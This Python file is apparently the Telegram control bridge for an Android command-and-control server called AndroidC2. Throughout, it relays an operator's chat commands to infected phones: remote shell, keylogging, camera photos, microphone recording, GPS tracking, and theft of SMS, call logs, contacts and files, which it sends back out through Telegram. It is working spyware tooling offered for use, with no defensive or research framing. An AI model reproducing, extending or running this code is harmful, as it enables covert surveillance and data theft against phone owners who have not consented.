#!/usr/bin/env python3
"""
Telegram bridge for AndroidC2 Flask server.

Polls Telegram for commands, translates them into Flask API calls,
and replies with results. Runs alongside app.py.
"""

import asyncio
import base64
import json
import os
import time
from pathlib import Path

import httpx

# --- Config ---
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID   = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
API_BASE  = f"https://api.telegram.org/bot{BOT_TOKEN}"
C2_BASE   = os.environ.get("C2_BASE", "http://127.0.0.1:5000")
C2_KEY    = os.environ.get("C2_API_KEY", "bukamal")
POLL_TIMEOUT = 30

SELECTED = {}

STATE_FILE = Path.home() / ".c2" / "bridge_state.json"
STATE_FILE.parent.mkdir(exist_ok=True)


def load_state():
    if STATE_FILE.exists():
        try:
            SELECTED.update(json.loads(STATE_FILE.read_text()))
        except Exception:
            pass


def save_state():
    STATE_FILE.write_text(json.dumps(SELECTED))


async def tg_send_text(client, text, chat_id=None):
    chat_id = chat_id or CHAT_ID
    await client.post(f"{API_BASE}/sendMessage", data={
        "chat_id": chat_id,
        "text": text[:4000],
        "parse_mode": "Markdown",
    })


async def tg_send_document(client, filename, content, mime="application/octet-stream"):
    await client.post(
        f"{API_BASE}/sendDocument",
        data={"chat_id": CHAT_ID},
        files={"document": (filename, content, mime)},
    )


async def tg_send_photo(client, filename, jpeg):
    await client.post(
        f"{API_BASE}/sendPhoto",
        data={"chat_id": CHAT_ID},
        files={"photo": (filename, jpeg, "image/jpeg")},
    )


def c2_headers():
    return {"X-Api-Key": C2_KEY, "Content-Type": "application/json"}


async def c2_devices(client):
    r = await client.get(f"{C2_BASE}/api/devices", headers=c2_headers())
    return r.json()


async def c2_send_command(client, device_id, ctype, args):
    r = await client.post(
        f"{C2_BASE}/api/device/{device_id}/command",
        headers=c2_headers(),
        json={"type": ctype, "args": args},
    )
    return r.json()


async def c2_get_command(client, device_id, cmd_id):
    r = await client.get(
        f"{C2_BASE}/api/device/{device_id}/commands",
        headers=c2_headers(),
    )
    for c in r.json():
        if c["id"] == cmd_id:
            return c
    return None


async def c2_wait_result(client, device_id, cmd_id, timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        c = await c2_get_command(client, device_id, cmd_id)
        if c and c["status"] in ("done", "failed"):
            return c
        await asyncio.sleep(1)
    return None


HELP = """*C2 Bridge*

`/list` — list devices
`/use <id>` — select device
`/info` — device info
`/shell <cmd>` — run shell
`/screenshot` — screen capture
`/camera [front|back]` — photo
`/mic [sec]` — record audio
`/location` — GPS
`/contacts` — contacts (JSON)
`/sms [n]` — last n SMS
`/calls [n]` — last n calls
`/apps` — installed apps
`/ls <path>` — list directory
`/get <path>` — download file
`/notif` — notifications
`/lock /home /back` — navigation
`/open <pkg>` — launch app
`/url <url>` — open URL
`/keylog_start /keylog_stop /keylog_dump`
`/whoami` — current device
"""


async def dispatch(client, text):
    parts = text.strip().split(" ", 1)
    cmd = parts[0].lstrip("/").lower()
    arg = parts[1] if len(parts) > 1 else ""

    chat = CHAT_ID
    dev = SELECTED.get(chat)

    if cmd in ("start", "help"):
        await tg_send_text(client, HELP)
        return
    if cmd == "list":
        devices = await c2_devices(client)
        if not devices:
            await tg_send_text(client, "no devices connected")
            return
        lines = ["*Devices:*"]
        for d in devices:
            mark = "→" if d["id"] == dev else " "
            lines.append(
                f"{mark} `{d['id']}` — {d.get('model') or '?'} "
                f"{'online' if d['is_online'] else 'offline'} "
                f"battery={d.get('battery')}%"
            )
        await tg_send_text(client, "\n".join(lines))
        return
    if cmd == "use":
        try:
            SELECTED[chat] = int(arg.strip())
            save_state()
            await tg_send_text(client, f"device set to {SELECTED[chat]}")
        except ValueError:
            await tg_send_text(client, "usage: /use <device_id>")
        return
    if cmd == "whoami":
        await tg_send_text(client, f"current device: {dev}")
        return

    if dev is None:
        await tg_send_text(client, "no device selected — use /list then /use <id>")
        return

    text_cmds = {
        "info":       ("device_info", {}),
        "location":   ("location", {}),
        "lock":       ("lock_screen", {}),
        "home":       ("go_home", {}),
        "back":       ("go_back", {}),
        "notif":      ("notifications", {}),
        "keylog_start": ("keylog_start", {}),
        "keylog_stop":  ("keylog_stop", {}),
        "keylog_dump":  ("keylog_dump", {}),
    }
    arg_cmds = {
        "shell":      ("shell", {"cmd": arg}),
        "ls":         ("list_dir", {"path": arg or "/sdcard"}),
        "open":       ("open_app", {"package": arg}),
        "url":        ("open_url", {"url": arg}),
    }

    if cmd in text_cmds:
        ctype, args = text_cmds[cmd]
        sent = await c2_send_command(client, dev, ctype, args)
        res = await c2_wait_result(client, dev, sent["id"], timeout=30)
        if not res:
            await tg_send_text(client, f"timeout: {ctype}")
            return
        await tg_send_text(client,
            f"`{ctype}` {res['status']}\n```\n{res['result'][:3500]}\n```")
        return

    if cmd in arg_cmds:
        ctype, args = arg_cmds[cmd]
        sent = await c2_send_command(client, dev, ctype, args)
        res = await c2_wait_result(client, dev, sent["id"], timeout=30)
        if not res:
            await tg_send_text(client, f"timeout: {ctype}")
            return
        await tg_send_text(client,
            f"`{ctype}` {res['status']}\n```\n{res['result'][:3500]}\n```")
        return

    if cmd == "screenshot":
        sent = await c2_send_command(client, dev, "screenshot", {})
        res = await c2_wait_result(client, dev, sent["id"], timeout=20)
        if not res or res["status"] != "done":
            await tg_send_text(client, f"failed: {res['result'] if res else 'timeout'}")
            return
        await asyncio.sleep(1)
        files = (await client.get(
            f"{C2_BASE}/api/device/{dev}/files", headers=c2_headers()
        )).json()
        shot = next((f for f in files if f["category"] == "screenshot"), None)
        if shot:
            data = (await client.get(
                f"{C2_BASE}/api/file/{shot['id']}/raw", headers=c2_headers()
            )).content
            await tg_send_photo(client, "screen.jpg", data)
        else:
            await tg_send_text(client, "screenshot ok but file missing")
        return

    if cmd == "get":
        if not arg:
            await tg_send_text(client, "usage: /get <path>")
            return
        sent = await c2_send_command(client, dev, "download_file", {"path": arg})
        res = await c2_wait_result(client, dev, sent["id"], timeout=60)
        if not res or res["status"] != "done":
            await tg_send_text(client, f"failed: {res['result'] if res else 'timeout'}")
            return
        try:
            obj = json.loads(res["result"])
            b64 = obj.get("data_b64", "")
            if not b64:
                await tg_send_text(client, f"no file: {res['result'][:200]}")
                return
            data = base64.b64decode(b64)
            name = arg.split("/")[-1] or "file.bin"
            await tg_send_document(client, name, data)
        except Exception as e:
            await tg_send_text(client, f"decode error: {e}")
        return

    if cmd in ("contacts", "sms", "calls", "apps"):
        mapping = {
            "contacts": ("contacts", {}, "contacts.json"),
            "sms": ("sms_list", {"limit": 50}, "sms.json"),
            "calls": ("call_log", {"limit": 50}, "calls.json"),
            "apps": ("list_apps", {}, "apps.json"),
        }
        ctype, args, fname = mapping[cmd]
        sent = await c2_send_command(client, dev, ctype, args)
        res = await c2_wait_result(client, dev, sent["id"], timeout=30)
        if res and res["status"] == "done":
            await tg_send_document(client, fname, res["result"].encode(), "application/json")
        else:
            await tg_send_text(client, f"failed: {res['result'] if res else 'timeout'}")
        return

    await tg_send_text(client, f"unknown: /{cmd}\n\n{HELP[:500]}")


async def poll_loop():
    offset = 0
    async with httpx.AsyncClient(timeout=POLL_TIMEOUT + 10) as client:
        await tg_send_text(client, "c2 bridge online", CHAT_ID)
        while True:
            try:
                r = await client.get(
                    f"{API_BASE}/getUpdates",
                    params={"offset": offset + 1, "timeout": POLL_TIMEOUT},
                )
                for upd in r.json().get("result", []):
                    offset = max(offset, upd["update_id"])
                    msg = upd.get("message") or {}
                    chat_id = str((msg.get("chat") or {}).get("id", ""))
                    if chat_id != CHAT_ID:
                        continue
                    text = msg.get("text", "")
                    if not text:
                        continue
                    try:
                        await dispatch(client, text)
                    except Exception as e:
                        await tg_send_text(client, f"error: {e}")
            except Exception as e:
                print(f"[bridge] poll error: {e}")
                await asyncio.sleep(3)


if __name__ == "__main__":
    load_state()
    print("[bridge] starting")
    asyncio.run(poll_loop())
